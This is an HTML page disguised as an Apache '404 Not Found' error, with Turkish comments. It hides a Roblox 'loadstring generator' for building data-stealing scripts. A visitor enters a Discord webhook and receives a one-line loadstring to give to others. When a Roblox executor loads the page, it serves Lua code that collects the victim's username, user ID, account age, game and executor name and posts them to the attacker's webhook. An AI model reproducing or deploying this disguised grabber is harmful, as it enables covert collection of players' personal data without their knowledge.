<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>404 Not Found</title>
    <style>
        /* Standart Sunucu 404 Hatası Görünümü */
        body {
            background-color: #ffffff;
            color: #000000;
            font-family: Arial, Helvetica, sans-serif;
            margin: 40px;
        }
        h1 {
            font-size: 24px;
            font-weight: normal;
            border-bottom: 1px solid #ccc;
            padding-bottom: 10px;
            margin-bottom: 10px;
        }
        p {
            font-size: 14px;
        }
        hr {
            border: 0;
            border-top: 1px solid #ccc;
            margin-top: 20px;
        }
        .server-info {
            font-size: 12px;
            color: #555;
            font-style: italic;
        }
        /* Arayüz Paneli (Sadece şifresiz ana linke girildiğinde görünür) */
        #generator-panel {
            display: none;
            background-color: #111;
            color: #fff;
            padding: 30px;
            border-radius: 12px;
            max-width: 500px;
            margin: 50px auto;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            font-family: sans-serif;
        }
        #generator-panel h2 { color: #00ff88; text-align: center; }
        #generator-panel input { width: 100%; padding: 12px; margin: 15px 0; background: #222; border: 1px solid #44; color: #fff; border-radius: 6px; box-sizing: border-box; }
        #generator-panel button { width: 100%; padding: 12px; background: #00ff88; color: #000; border: none; font-weight: bold; border-radius: 6px; cursor: pointer; }
        #generator-panel textarea { width: 100%; height: 60px; margin-top: 15px; background: #050505; color: #00ff88; border: 1px solid #333; padding: 10px; resize: none; border-radius: 6px; font-family: monospace; box-sizing: border-box; }
    </style>
</head>
<body>

<div id="error-page">
    <h1>404 Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <p class="server-info">Apache/2.4.41 (Ubuntu) Server at github.io Port 443</p>
</div>

<div id="generator-panel">
    <h2>Roblox Loadstring Generator</h2>
    <input type="text" id="webhookUrl" placeholder="Discord Webhook Linkinizi Girin...">
    <button onclick="generateLink()">Loadstring Linki Oluştur</button>
    
    <div id="resultBox" style="display:none;">
        <textarea id="outputCode" readonly></textarea>
        <button style="background:#333; color:#fff; margin-top:10px;" onclick="copyToClipboard()">Kodu Kopyala</button>
    </div>
</div>

<script>
window.onload = function() {
    const hash = window.location.hash;
    
    // Eğer linkin sonunda webhook parametresi varsa (# varsa)
    if (hash && hash.length > 10) {
        document.getElementById('error-page').style.display = 'block';
        document.getElementById('generator-panel').style.display = 'none';
        document.title = "404 Not Found";
        
        let decodedWebhook = "";
        try {
            // Webhook URL'ini güvenli şekilde çözer
            decodedWebhook = atob(hash.substring(1));
        } catch(e) {
            return;
        }

        // Roblox executor'ın sayfaya bağlandığında göreceği gerçek ham Lua kodu
        const luaScriptOutput = `local webhook = "${decodedWebhook}"
local Players = game:GetService("Players")
local Market = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")

local player = Players.LocalPlayer
local userId = player.UserId
local username = player.Name
local displayName = player.DisplayName
local profileUrl = "https://www.roblox.com/users/" .. userId .. "/profile"
local playerInServer = #Players:GetPlayers()
local accountAge = player.AccountAge

local gameName = "Bilinmiyor"
pcall(function()
    gameName = Market:GetProductInfo(game.PlaceId).Name
end)

local executor = identifyexecutor and identifyexecutor() or "Bilinmeyen Executor"
local timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")

local data = {
    ["embeds"] = {{
        ["title"] = "🚀 Veri Alındı!",
        ["color"] = 65280,
        ["fields"] = {
            {["name"] = "Username", ["value"] = username, ["inline"] = true},
            {["name"] = "Display Name", ["value"] = displayName, ["inline"] = true},
            {["name"] = "User ID", ["value"] = tostring(userId), ["inline"] = true},
            {["name"] = "Hesap Yaşı", ["value"] = tostring(accountAge) .. " Gün", ["inline"] = true},
            {["name"] = "Kişi Sayısı", ["value"] = tostring(playerInServer) .. " Oyuncu", ["inline"] = true},
            {["name"] = "Executor", ["value"] = executor, ["inline"] = true},
            {["name"] = "Oyun", ["value"] = gameName, ["inline"] = false},
            {["name"] = "Profil", ["value"] = "[Profile Linki](" .. profileUrl .. ")", ["inline"] = false}
        },
        ["timestamp"] = timestamp
    }}
}

-- Webhook veri iletimini kesinleştiren istek bloğu
local request = http_request or request or syn and syn.request or http and http.request
if request then
    request({
        Url = webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = HttpService:JSONEncode(data)
    })
end`;

        // Tarayıcı kaynak kodunu temizler ve executor'ın okuyabileceği ham metne dönüştürür
        document.body.innerHTML = "";
        document.body.style.whiteSpace = "pre";
        document.body.style.fontFamily = "monospace";
        document.body.textContent = luaScriptOutput;
        
    } else {
        // Eğer normal girildiyse oluşturucu paneli göster
        document.getElementById('error-page').style.display = 'none';
        document.getElementById('generator-panel').style.display = 'block';
        document.title = "Loadstring Generator";
    }
}

function generateLink() {
    const wh = document.getElementById('webhookUrl').value.trim();
    if(!wh.includes('discord.com/api/webhooks/')) {
        alert('Geçerli bir webhook girin!');
        return;
    }
    const encoded = btoa(wh);
    const cleanUrl = window.location.href.split('#')[0];
    const finalPageUrl = cleanUrl + "#" + encoded;
    
    // İstediğin gibi tertemiz tek satır loadstring formatı
    const finalLoadstring = `loadstring(game:HttpGet("${finalPageUrl}"))()`;

    document.getElementById('outputCode').value = finalLoadstring;
    document.getElementById('resultBox').style.display = 'block';
}

function copyToClipboard() {
    const copyText = document.getElementById("outputCode");
    copyText.select();
    navigator.clipboard.writeText(copyText.value);
    alert("Loadstring kodu başarıyla kopyalandı!");
}
</script>
</body>
</html>
